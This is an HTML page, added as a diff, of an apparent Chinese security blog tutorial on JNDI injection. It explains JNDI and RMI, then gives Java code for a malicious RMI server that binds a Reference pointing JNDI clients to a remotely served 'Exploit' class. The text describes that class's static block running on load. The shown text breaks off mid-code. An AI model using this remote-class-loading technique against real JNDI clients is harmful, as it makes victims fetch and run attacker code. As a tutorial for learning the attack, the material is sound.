@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>JNDI注入 | yingzui's blog</title><meta name="keywords" content="java安全,RMI,JNDI"><meta name="author" content="yingzui"><meta name="copyright" content="yingzui"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="JNDI注入JNDI首先来了解一下，JNDI的出现是为了解决什么问题？ 有jndi之前没有jndi之前，对于一个外部依赖，像mysql数据库，程序开发的过程中需要将具体的数据库地址参数写入到java代码中，程序才能找到具体的数据库地址进行链接。那么数据库配置这些信息可能经常变动的。这就需要开发经常手动去调整配置。 类似于如下这种： 12345678910111213141516Connection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="http://yingzui.github.io/2022/11/20/JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="yingzui&#39;s blog">
+<meta property="og:description" content="JNDI注入JNDI首先来了解一下，JNDI的出现是为了解决什么问题？ 有jndi之前没有jndi之前，对于一个外部依赖，像mysql数据库，程序开发的过程中需要将具体的数据库地址参数写入到java代码中，程序才能找到具体的数据库地址进行链接。那么数据库配置这些信息可能经常变动的。这就需要开发经常手动去调整配置。 类似于如下这种： 12345678910111213141516Connection">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yingzui.github.io/img/default.png">
+<meta property="article:published_time" content="2022-11-20T09:05:26.000Z">
+<meta property="article:modified_time" content="2022-11-20T09:10:51.791Z">
+<meta property="article:author" content="yingzui">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="RMI">
+<meta property="article:tag" content="JNDI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yingzui.github.io/img/default.png"><link rel="shortcut icon" href="/img/touxiang.png"><link rel="canonical" href="http://yingzui.github.io/2022/11/20/JNDI%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'JNDI注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-20 17:10:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="yingzui's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yingzui's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">JNDI注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-20T09:05:26.000Z" title="发表于 2022-11-20 17:05:26">2022-11-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-20T09:10:51.791Z" title="更新于 2022-11-20 17:10:51">2022-11-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="JNDI注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>首先来了解一下，JNDI的出现是为了解决什么问题？</p>
+<h3 id="有jndi之前"><a href="#有jndi之前" class="headerlink" title="有jndi之前"></a>有jndi之前</h3><p>没有jndi之前，对于一个外部依赖，像mysql数据库，程序开发的过程中需要将具体的数据库地址参数写入到java代码中，程序才能找到具体的数据库地址进行链接。那么数据库配置这些信息可能经常变动的。这就需要开发经常手动去调整配置。</p>
+<p>类似于如下这种：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Connection conn=<span class="literal">null</span>; </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>, <span class="literal">true</span>, Thread.currentThread().getContextClassLoader()); </span><br><span class="line">    conn=DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://MyDBServer?user=qingfeng&amp;password=mingyue&quot;</span>); </span><br><span class="line">    <span class="comment">/* 使用conn并进行SQL操作 */</span></span><br><span class="line">    ...... </span><br><span class="line">    conn.close(); </span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e) &#123; </span><br><span class="line">    e.printStackTrace(); </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">finally</span> &#123; </span><br><span class="line">  <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123; </span><br><span class="line">  <span class="keyword">try</span> &#123; </span><br><span class="line">      conn.close(); </span><br><span class="line">  &#125;<span class="keyword">catch</span>(SQLException e) &#123;&#125; </span><br><span class="line"> &#125;  &lt;br&gt;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种做法一般在小规模的开发过程中不会产生问题，只要程序员熟悉Java语言、了解JDBC技术和MySQL，可以很快开发出相应的应用程序。</p>
+<p>那么这样有什么问题呢？</p>
+<p>1、数据库服务器名称MyDBServer 、用户名和口令都可能需要改变，由此引发JDBC URL需要修改；</p>
+<p>2、数据库可能改用别的产品，如改用DB2或者Oracle，引发JDBC驱动程序包和类名需要修改；</p>
+<p>3、随着实际使用终端的增加，原配置的连接池参数可能需要调整；</p>
+<p>等等。。。。。</p>
+<p>解决办法：</p>
+<p>程序员应该不需要关心“具体的数据库后台是什么？JDBC驱动程序是什么？JDBC URL格式是什么？访问数据库的用户名和口令是什么？”等等这些问题，程序员编写的程序应该没有对 JDBC 驱动程序的引用，没有服务器名称，没有用户名称或口令 —— 甚至没有数据库池或连接管理。而是把这些问题交给J2EE容器来配置和管理，程序员只需要对这些配置和管理进行引用即可。</p>
+<p>由此，就有了JNDI。</p>
+<h3 id="有jndi之后"><a href="#有jndi之后" class="headerlink" title="有jndi之后"></a>有jndi之后</h3><p>有了jndi后，程序员可以不去管数据库相关的配置信息，这些配置都交给J2EE容器来配置和管理，程序员只要对这些配置和管理进行引用即可。其实就是给资源起个名字，再根据名字来找资源。</p>
+<p>首先，在J2EE容器中配置JNDI参数，定义一个数据源，也就是JDBC引用参数，给这个数据源设置一个名称；然后，在程序中，通过数据源名称引用数据源从而访问后台数据库。</p>
+<p>以下为例子：来自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/study-everyday/p/6723313.html#autoid-0-0-1">JNDI是什么，怎么理解 - 明志健致远 - 博客园 (cnblogs.com)</a></p>
+<ol>
+<li><p>配置数据源</p>
+<p>在JBoss的 <code>D:/jboss420GA/docs/examples/jca</code> 文件夹下面，有很多不同数据库引用的数据源定义模板。将其中的 mysql-ds.xml 文件Copy到你使用的服务器下，如 <code>D:/jboss420GA/server/default/deploy</code>。</p>
+<p>修改 <code>mysql-ds.xml</code> 文件的内容，使之能通过JDBC正确访问你的MySQL数据库，如下：</p>
+</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">datasources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">local-tx-datasource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jndi-name</span>&gt;</span>MySqlDS<span class="tag">&lt;/<span class="name">jndi-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">connection-url</span>&gt;</span>jdbc:mysql://localhost:3306/lw<span class="tag">&lt;/<span class="name">connection-url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">driver-class</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">driver-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user-name</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>rootpassword<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exception-sorter-class-name</span>&gt;</span>org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter<span class="tag">&lt;/<span class="name">exception-sorter-class-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">metadata</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type-mapping</span>&gt;</span>mySQL<span class="tag">&lt;/<span class="name">type-mapping</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">metadata</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">local-tx-datasource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">datasources</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里，定义了一个名为MySqlDS的数据源，其参数包括JDBC的URL，驱动类名，用户名及密码等。</p>
+<ol start="2">
+<li>在程序中引用数据源：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Connection conn=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  Context ctx=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">  Object datasourceRef=ctx.lookup(<span class="string">&quot;java:MySqlDS&quot;</span>); <span class="comment">//引用数据源</span></span><br><span class="line">  DataSource ds=(Datasource)datasourceRef;</span><br><span class="line">  conn=ds.getConnection();</span><br><span class="line">  <span class="comment">/* 使用conn进行数据库SQL操作 */</span></span><br><span class="line">  ......</span><br><span class="line">  c.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      conn.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(SQLException e) &#123; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接使用JDBC或者通过JNDI引用数据源的编程代码量相差无几，但是现在的程序可以不用关心具体JDBC参数了。<br>在系统部署后，如果数据库的相关参数变更，只需要重新配置 mysql-ds.xml 修改其中的JDBC参数，只要保证数据源的名称不变，那么程序源代码就无需修改。</p>
+<p><font color="red">由此可见，JNDI避免了程序与数据库之间的紧耦合，使应用更加易于配置、易于部署。</font></p>
+<h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p>JNDI,翻译为Java命名和目录结构(JavaNaming And Directory Interface)官方对其解释为JNDI是一组在Java应用中访问命名和目录服务的API(ApplicationProgramming Interface)说明很精炼,但是比较抽象。</p>
+<h3 id="命名服务"><a href="#命名服务" class="headerlink" title="命名服务"></a>命名服务</h3><p>关于命名服务,其实我们很多时候都在用它,但是并不知道它是它,比较典型的是域名服务器DNS(Domain Naming Service),大对人对DNS还是比较了解的,它是将域名映射到IP地址的服务.比如百度的域名<a target="_blank" rel="noopener" href="http://developer.51cto.com/art/201112/www.baidu.com">www.baidu.com</a>所映射的IP地址是<a target="_blank" rel="noopener" href="http://202.108.22.5/,%E4%BD%A0%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%BE%93%E5%85%A5%E4%B8%A4%E4%B8%AA%E5%86%85%E5%AE%B9%E6%98%AF%E5%88%B0%E7%9A%84%E5%90%8C%E4%B8%80%E4%B8%AA%E9%A1%B5%E9%9D%A2">http://202.108.22.5/,你在浏览器中输入两个内容是到的同一个页面</a></p>
+<p>可以看出命名服务的特点:一个值和另一个值的映射,将我们人类更容易认识的值同计算机更容易认识的值进行一一映射。</p>
+<h3 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h3><p>至于目录服务,从计算机角度理解为在互联网上有着各种各样的资源和主机,但是这些内容都是散落在互联网中，为了访问这些散落的资源并获得相应的服务，就需要用到目录服务。</p>
+<p>从我们日常生活中去理解目录服务的概念可以从电话簿说起，电话簿本身就是一个比较典型的目录服务,如果你要找到某个人的电话号码，你需要从电话簿里找到这个人的名称，然后再看其电话号码。</p>
+<p>理解了命名服务和目录服务再回过头来看JDNI，它是一个为Java应用程序提供命名服务的应用程序接口，为我们提供了查找和访问各种命名和目录服务的通用统一的接口。<font color="red">通过JNDI统一接口我们可以来访问各种不同类型的服务。</font>如下图所示，我们可以通过JNDI API来访问刚才谈到的DNS。</p>
+<p><img src="/images/image-20221114161336930.png" alt="image-20221114161336930"></p>
+<p>JNDI客户端通过名字来查找所需对象，这些对象可以保存在多种的命名服务和目录服务中，像RMI( Remte Method Invocation)、CoRBA(Common Object Quest Broker Architecture, LDAP(Lightweight Directory Access Protocol)、DNS等。</p>
+<h2 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><p>RMI的Registry、Server、Client 的调用关系可以总结为这个图：</p>
+<p><img src="/images/image-20221116160107853.png" alt="image-20221116160107853"></p>
+<p>JNDI和RMI的调用流程大致是：JNDI 在请求到 RMI 之后，RMI 返回了 Exploit 的 http 地址，JNDI 则通过网络获取到了这个类文件，通过类加载器将其加载到了JVM中并且实例化了这个类，而 Exploit 的静态代码块内是打开计算器的代码，实例化时就会执行这段代码。</p>
+<p><img src="/images/image-20221116160045618.png" alt="image-20221116160045618"></p>
+<p>先看一个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">obj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(obj.sayHello(<span class="string">&quot;gogogo&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">//    UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20221117204016489.png" alt="image-20221117204016489"></p>
+<p>这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的 <code>lookup()</code> 方法。</p>
+<p><img src="/images/image-20221117205830601.png" alt="image-20221117205830601"></p>
+<p>所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。</p>
+<h3 id="JNDI注入-2"><a href="#JNDI注入-2" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</p>
+<p>原理是在服务端调用了一个 <code>Reference</code> 对象，我个人的理解，它是很像代理的。</p>
+<p>代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//这是原来的</span></span><br><span class="line">        <span class="comment">//initialContext.rebind(&quot;rmi://127.0.0.1:1099/remoteObj&quot;,new RemoteObjImpl());</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>,reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">obj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(obj.sayHello(<span 